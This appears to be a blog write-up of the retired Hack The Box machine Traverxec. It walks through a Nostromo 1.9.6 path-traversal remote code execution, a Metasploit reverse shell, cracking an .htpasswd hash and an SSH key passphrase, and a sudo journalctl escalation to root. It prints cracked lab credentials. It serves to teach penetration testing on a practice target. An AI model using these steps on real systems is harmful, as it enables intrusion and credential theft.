---
path: "/blog/hack-the-box-traverxec"
date: "2020-04-26"
title: "Hack The Box Write-up: Traverxec"
description: "A tutorial on owning the retired machine Traverxec on Hack The Box"
hero: "./blog-hero.png"
---
A few weeks ago [Hack The Box](https://www.hackthebox.eu/) retired the machine Traverxec, a great box to get started with penetration testing!
>  Hack The Box is an online platform allowing for penetration testing skills to be practised and for exchanging of ideas and methodologies with a community of  cyber security enthusiasts.

 Let's boot up Kali Linux, connect to the Hack The Box VPN and get hacking.

## Foothold
### Enumeration
As always we start off with enumeration. 

Let's kick of an nmap scan to determine what ports are open.
Run `nmap -v -A 10.10.10.165`
```
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

The results of this command tell us a few things: 
- It's serving a website over HTTP using a web server called Nostromo v1.9.6
- SSH is available
- The operating system appears to be Debian.  

Let's have a closer look at the website the box is serving. 
Enter http://10.10.10.165 into a web browser.

It appears to be a pretty standard portfolio website for a guy named David. There is a contact form which performs a GET request to empty.html and responds with: "No mail sent. Not yet finished. Please come back soon!". Other than that, the site seems pretty uninteresting.

Let's brute force directories on the web server to see if there is any other site being hosted.
Fire up Dirbuster, point it at http://10.10.10.165, increase thread count, select the wordlist at `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`, change the file extension to "html,txt". Then hit start and let Dirbuster do its thing.

Again the results of this aren't hugely interesting, it seems that this portfolio website is the only site being hosted.

Finally let's check out Nostromo v1.9.6, I've never actually heard of this web server before, maybe there is a reason for that...
Run `searchsploit nostromo`. This command searches the https://exploit-db.com database for any known vulnerabilities.

Now that is more interesting, there is a remote code execution exploit for Nostromo v1.9.6, the exact version that this box is running.
The exploit script is also written in Ruby and so is likely written for Metasploit.

### Exploitation
Lets open up Metasploit and see if we can use this remote code execution exploit we found.
Run `msfconsole`

We can then search for Nostromo exploits.
Run `search nostromo`.

It looks like the exploit is in Metasploit, let's select it.
Run `use exploit/multi/http/nostromo_code_exec`.

Now it's time to set the options.
Run `show options`

Looks like all we need to set is the RHOSTS (remote hosts) aka the box(s) we are attacking, and the LHOST (listening host) aka our machine.
Run `set RHOSTS 10.10.10.156` and `set LHOST <YOUR_IP>`. Note: You can enter your IP address or you can enter your HTB VPN network interface name e.g. `set LHOST tun0`

The payload, (the remote code), that we will be executing on the victims machine seems to be a Perl script that will give us a reverse shell. Let's leave it as the default for now, we can always change it if the machine doesn't have Perl installed.

Let's try it out.
Run `exploit`

Boom. We should now have a reverse meterpreter shell on the machine. Run `shell` to drop us into `/bin/sh` shell.

But what happened? First the exploit sent a GET request to `/` in order to look at the Server response header to determine if the exploit is compatible.
The Server header contains Nostromo 1.9.6 and so the exploit continues. The exploit then performs a POST request to `/.%0d./.%0d./.%0d./.%0d./bin/sh` with the request body being the Perl payload to spawn a reverse shell. What is that path? If we remove the `%0d`, it looks like this `/../../../../bin/sh`, that looks a relative path to to `/bin/sh`, and that's exactly what it is! We are performing a path traversal attack.

A path traversal attack is a type of attack commonly performed against web servers. Web servers are configured to serve content, usually web pages, in a configured directory to anyone who visits the server. Web server software has to be very careful with this feature though as if a malicious user is able to escape outside of the configured directory, they would have access to other sensitive files on the server! This exactly what we are doing, we send a HTTP message that escapes outside of the configured directory to access to `/bin/sh` file which then executes our Perl reverse shell code that we placed in the body of our HTTP message.

So what is this `%0d`? It's a HEX representation of a carriage return in ASCII. We need this due to the fact that the Nostromo source code in version 1.9.6 tries to defend against this attack via an if statement that specifically checks for `/../` in the path of incoming HTTP messages and returns a HTTP 400 if it matches. We dodge matching that if statement by placing a carriage return between it, `/.%0d./`, and then finally Nostromo made the mistake of cutting out carraige return characters meaning that after we pass the if statement and the carriage returns get cut out, the request path then looks like this:  `/../../../../bin/sh`. Perfect.

## Privilege Escalation
#### User Enumeration
Running a `whoami`, will tell us that we are currently the user `www-data`, looks like we will need to privilege escalate. 

Let's have a look around.

I always like to start by taking a look at the passwd file: `cat /etc/passwd`. This tells us there is another user on the server called David.
A quick `ls -l /home` tells us David has a home directory and also its permissions. Interestingly it seems the permissions of David's home directory is: `drwx--x--x`. The execute bit is set for any user which means although we can not write content to the directory, or even list the contents of the directory, we can change into the directory. You can try this with a `cd /home/david`. Notice you don't get a permission denied but as soon as you perform an `ls`, you do. This is certainly interesting and so we can make a note of this as it may come into play later.

Next let's look at the source code to see if we can find any server-side code we can take advantage of.
We can find the source code for David's site at `cd /var/nostromo/`.
We can take a closer look at `empty.html`, the page that the contact form was POST-ing to and see that is always returns the text: "No mail sent. Not yet finished. Please come back soon!" regardless of what we send in
 the contact form, looks like that contact form is still being worked on, we can cross that out in our notes. Aside from that, nothing too interesting to be found in the source code. 

Next let's take a look at the configuration for Nostromo. We can find the `nhttpd.conf` in `/var/nostromo/conf/`. It seems to look like a standard web server config file until we reach the basic authentication header.
This specifies an access file called `.htaccess` which is secured by the password file: `/var/nostromo/conf/.htpasswd`. Sure enough, this password file exists and within it we can find the following:

```
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

That looks like a username and password hash. We can use the command line tool `hash-identifier` to determine the hash type.
It seems to identify the hash as MD5 (Unix).

There is no sign of the .htaccess file at the moment though.

Interestingly the config also states that the web server is serving home directories and password protecting a directory called `public_www`.

It is also good practise to execute [LinEnum.sh](https://github.com/rebootuser/LinEnum), a tool used to help identify ways in which we can privilege escalate, however I think we have everything we need for now.

#### User Exploitation
Let's try and crack the hash we found in `.htpasswd`. We can use a command line tool called `hashcat` to perform a brute force attack. Kali Linux comes with a few wordlists, the one we will be using for this tutorial is called `rockyou.txt`. Note: you may need to extract this wordlist if you haven't use it before, it can be found at: `/usr/share/wordlists`.

We already identified that the hash is an MD5 (Unix) hash and so we can configure hashcat to attempt to crack this hash with the following command:
```
hashcat -m 500 -a 3 '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' /usr/share/wordlists/rockyou.txt --show
```
The `-m 500` sets the hash mode to MD5 (Unix) and the `-a 3` sets the attack mode to brute force.
Note: If you are within a VM, add a `--force` on the end of this command.

Hashcat should quickly crack this password and output the following:
```
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```

We can try and use this password to switch the user to David with a `su david` or ssh into the server as David, however it seems David is not reusing this password.

Next we can inspect Nostromo serving home directories. Let's go to http://10.10.10.165/~david in our browser. We get a colourful webpage telling us the page is private, we'll see about that...

If you remember the contents of the Nostromo config file, `/var/nostromo/conf/nhttpd.conf`, the directory `public_www` is password protected.
Previously we also determined that we could change directory into David's home directory since the executable bit was set for all users. Let's try and change into this `public_www` directory with a `cd /home/david/public_www`. 
After running this, we can see that it was successful and we can even perform an `ls`. This makes sense since we are the same user as the Nostromo web server, `www-data`, so we access to all files it can serve. Interestingly the `ls` in this directory informed us of a zipped file called `backup-ssh-identify-files.tgz`. Let's download them. We can do so by visiting http://10.10.10.165/~david/public_www/backup-ssh-identify-files.tgz in our browser and then providing "David" and the password we cracked: "Nowonly4me" as the basic authentication username and password. After downloading this zipped file, we can unzip it to discover our loot, some ssh keys.

If we look at the private ssh key: `cat backup-ssh-identify-files/home/david/.ssh/id_rsa`, we can note that the key is encryped and so was created with a passphrase. This means we will need to brute force crack the passphrase. We can do so with a little help of a command line tool called `john`.

First we need to convert the encryped private key to a format that `john` can use. We can do this will the following command:
`/usr/share/john/ssh2john.py id_rsa > id_rsa.hash`, then we can use `john` to brute force this hash with this command: 
`john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt`. This should complete quickly and tell us that the passphrase is: "hunter".

Now let's try and ssh into the server as David. `ssh david@10.10.10.165 -i id_rsa` and provide "hunter" as the passphrase.

We are in. We can collect the user flag at `~/user.txt`.

#### Root Enumeration
Now we are able to access the server as David, let's have a look around. Performing an `ls` in David's home directory tells us there is a directory called bin, inside that there is script called `server-stats.sh`. Looking at the source code for it, amongst other things it seems to use the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat` to provide the user with some information about the Nostromo process. If we run this script: `./server-stats.sh` we can see that it does indeed do this... however it did not ask David for a password... It seems as though it has been configured to allow David to run the command `sudo /usr/bin/journalctl -n5 -unostromo.service` without providing a password for sudo. This is never a good idea and we can abuse this to get root access to the server.

#### Root Exploitation
If we visit the [GTFO.bins](https://gtfobins.github.io/) page for [journalctl](https://gtfobins.github.io/gtfobins/journalctl/), we can see that it is possible to spawn a shell using the command `!/bin/sh`, due to the fact that it invokes the default pager which is likely to be [less](https://gtfobins.github.io/gtfobins/less/).

Now If we run the command `sudo /usr/bin/journalctl -n5 -unostromo.service`, we should be greeted with the output of the command within a program that looks like less, and if we run the command `!/bin/sh`, it should spawn us a shell.

Performing a `whoami` should tell us we are now root. We can collect the flag at `~/root.txt`.

We have now owned the box :) 

## Review
This is the second box I have successfully rooted on [Hack The Box](https://www.hackthebox.eu/) and I really enjoyed it! It is a relatively easy box, a great box if you are just getting started and yet it offers plenty to learn.

It's great as an introduction to brute force cracking hashes and as a lesson to all to ensure that software is kept up-to-date, no password sudo access is not configured and not to serve home directories from a web server.
My only critique is that privilege escalating to root was a little too easy.

I plan to attempt to root more machines on [Hack The Box](https://www.hackthebox.eu/) so expect more write-up blogs as machines get retired.
